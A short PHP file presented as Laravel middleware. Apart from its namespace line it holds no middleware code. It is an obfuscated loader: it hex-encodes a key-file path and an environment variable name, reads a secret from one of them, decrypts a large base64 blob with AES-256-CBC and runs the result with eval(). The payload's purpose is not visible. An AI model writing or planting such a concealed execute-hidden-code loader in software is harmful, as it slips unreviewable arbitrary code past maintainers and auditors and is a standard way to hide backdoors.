<?php
namespace App\Http\Middleware;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('+oQTp+pxOcN13jUmFobuog==');

$c=base64_decode(

'B/lSIoq0MeFnnMSnsTHP+ds36p0fdaN2DN7f9KlBreIXkMcr8pz9GpUucMa5ysl1Qw7SbHRMtc/X' .
'zbZXdfyAO3iwDz5ddnqJxt2wJtyeO3HrFoK8msW+6I+JYWQV6vEGoyA+PpBptOd/D28sBUBHy8M9' .
'ZoNWTFcrU4vL0sqtmzGlVG2pDX6ODvcNAK2xBDRJpr+oqyxjUhPwl+G86giY03KmZI9Hxu5QGICz' .
'BblrmjCUAaEh2byOUA3AiXjY8ChHYHp9pdva8FNsSOYv2KPxgNY0vIQLidiCSHYTKuO6266h2V1O' .
'fgNsSTh8/NN1t7/jro4Q9hNaz8Yc5oZaSfYZD5IJN50mw29R+oKX23lVSEN+zpXWBDEcrqLe7/Ea' .
'wle74teDeG2UN7ORTyi71Shxh18o49mlbpSww2RQskgMHA5wLUD1wB8FBUmrHAdNZS/ZCFBv679Z' .
'uIy14leCpiGuYYSTlx/NAg0WUAqxJTgju2Zv4uCfwZrWLFWoSP4dGeY4kfd52PKzxCwmFUsd8hPy' .
'mFZ/eIUgtNUI7lqC2xypmC5OP26tHx0LcKX6dxEudbf1Dutq7AEXD4uiO04UvHR62DbTIDj5zzfE' .
'nPVZ0uFimu7JRxQU1x6KTtkFl8utLti2Zx6nOJsFKkhw4zIlOHWbMJ1pnkRK5/B9MLXuIyTFd5Va' .
'5nXhKbgEWwYM9IDFqrhyjnHRPfw2iyvZxu0iEofdJSFBm4Z4HTb/LN1DrcisdvEC0GkMUyVhITgT' .
'KUN+oi2diXSYliHlbH6PQ2upCX0UKscIxhRO4nWsPI+W0HTR/lv+rUzCJ952YOJJxL61K2EEmuTd' .
'6aDGG+7ckiG0nvhd8stpk9wLawkLrZjQBA8MCo8pZ0XdKzqP1BhbYqM9ZVZS0m19gHjbQAz0yrLv' .
'8qULJWK5ZsSm7aYBEyCOudFgmc3NhyqQwlYST3byLvbfHW7KoDgPWwQYUGs2bgp2KvNo3d9219fY' .
'chnum89WsqeKWObf6E/OZ1bIn5rNSgVRFtXoa8vwvELR0LPAc02hA1QHRvKzdCu+RzSI6xTNPUTl' .
'K3XgeZPb4Di0gKa4JypoiEcUsyLn0X4DggRjcokG3viRRkK6RySogDrKBm2hnfO9CycA+jT9m35x' .
'Ju7I5p3bIFbDG5VIv5YZCesGC5dQA6+z3zCi3MChzk6/Zakxsy5OMEtrDPZhcgub4jsPqdHpmXeG' .
'S5vy2BGb2IPkcxF+Iq6dmnZLE9FnzOlfvzLOthRpvljmJwkxvFRCQ/O9f1XRbsz4HI28olCsYluf' .
'GfNsjtcJ2CATLv37Yuqbk2K/rjlNodJmLlAtF9AQJoswgPbTCoOEDKljCc7mz2bdrZMfndpqb2dk' .
'kB3veI8uX74XNOdJ5dXK87QenxQNy+yMAcc0rksv3AThhHhAUiD4dEnKcrNGjBOAtX6giSpbB94l' .
'RDOuGe7v2WfSqzEig75T1MwdS0thyhzrRpvQ2suOXlysQXBydjuUPk5A9GkwpjYiNLd8u6ru3VXR' .
'n+5j2lLNB+LGGJvZjrUtKHmFIB+XVcTQuUh1kw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

